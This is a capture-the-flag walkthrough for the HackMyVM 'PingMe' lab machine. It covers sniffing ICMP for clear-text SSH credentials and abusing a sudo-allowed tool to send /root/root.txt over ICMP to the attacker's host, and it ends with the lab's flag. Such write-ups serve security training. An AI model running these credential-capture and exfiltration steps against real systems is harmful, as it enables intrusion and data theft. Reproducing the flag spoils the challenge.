
# **PingMe || HackMyVM**

***
## **Difficulty : Medium**

![](https://i.imgur.com/JUhKVzd.png)

***


Running our nmap scan we have the below output


```bash
# Nmap 7.94SVN scan initiated Thu Oct 17 20:26:24 2024 as: /usr/lib/nmap/nmap --privileged -p- -T4 -v -sCV -oN nmap.txt 192.168.0.151
Nmap scan report for pingme (192.168.0.151)
Host is up (0.00032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 1f:e7:c0:44:2a:9c:ed:91:ca:dd:46:b7:b3:3f:42:4b (RSA)
|   256 e3:ce:72:cb:50:48:a1:2c:79:94:62:53:8b:61:0d:23 (ECDSA)
|_  256 53:84:2c:86:21:b6:e6:1a:89:97:98:cc:27:00:0c:b0 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Ping test
|_http-server-header: nginx/1.18.0
MAC Address: 08:00:27:E4:61:33 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 17 20:26:49 2024 -- 1 IP address (1 host up) scanned in 24.47 seconds
```


Navigating to port 80/HTTP we have the below page, which automatically pings the IP making the request to this site


![](https://i.imgur.com/oLJItSd.png)


Viewing page-source we have some few commented texts.


![](https://i.imgur.com/dBO2OXy.png)



To me this looks like an hint telling us to listen for ICMP echo requests, It is good practice not just to listen but to use the `-A` option to display all data as described [here](https://stackoverflow.com/questions/38342290/how-to-display-all-data-using-tcpdump)


```bash
❯ sudo tcpdump -i wlan0 icmp -A
[sudo] password for sec-fortress: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on wlan0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

Then navigate to the website and refresh the page in which going back to our command lie you should see clear text credentials


![](https://i.imgur.com/6UX5S3u.jpeg)


We have the following credential ; `pinger:P!ngM3`, we can go ahead and try to use this to login via the SSH protocol, which works!!


```bash
❯ ssh pinger@192.168.0.151
The authenticity of host '192.168.0.151 (192.168.0.151)' can't be established.
ED25519 key fingerprint is SHA256:jIHuqj6aE+2blT+6SnkGKkaR7dRiUscb9FAVVG/h9DU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.151' (ED25519) to the list of known hosts.
pinger@192.168.0.151's password: 
Linux pingme 5.10.0-11-amd64 #1 SMP Debian 5.10.92-1 (2022-01-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Mar  5 19:21:06 2022 from 10.0.0.10
pinger@pingme:~$ whoami
pinger
pinger@pingme:~$ hostnamectl
   Static hostname: pingme
         Icon name: computer-vm
           Chassis: vm
        Machine ID: aabb374821d64f88bd7c0f7a62c74a03
           Boot ID: 4e955ff521ce46d9b87087be2b47370a
    Virtualization: oracle
  Operating System: Debian GNU/Linux 11 (bullseye)
            Kernel: Linux 5.10.0-11-amd64
      Architecture: x86-64
pinger@pingme:~$ 
```



Navigating to the `/var/www/html` directory and examining the `index.php` we can see how our user foothold was possible as described in the image below. 


![](https://i.imgur.com/T0r4WZz.png)



Checking for executables our current user can run with the `sudo` command we have the below output


```bash
pinger@pingme:/var/www/html$ sudo -l
Matching Defaults entries for pinger on pingme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pinger may run the following commands on pingme:
    (root) NOPASSWD: /usr/local/sbin/sendfilebyping
pinger@pingme:/var/www/html$ 
```


It is possible to read the root flag as this program sends data over the ICMP protocol and it is most likely wouldn't be comfortable getting a reverse shell.


- Start up `tcpdump` listening on the ICMP protocol

```bash
❯ sudo tcpdump -i wlan0 icmp -A
```

- Then execute this command to get the root flag


```bash
pinger@pingme:/var/www/html$ sudo /usr/local/sbin/sendfilebyping 192.168.0.158 /root/root.txt
```


![](https://i.imgur.com/9BL8nDS.jpeg)


> **Note :** The root flag is  in sequence so, H - move to the next line, M - move to the next line, V - move to the next line.....Just like this.




<details>
  <summary>Root Flag Spoiler Warning</summary>
  
HMV{ICMPcanBeAbused}
  
</details>
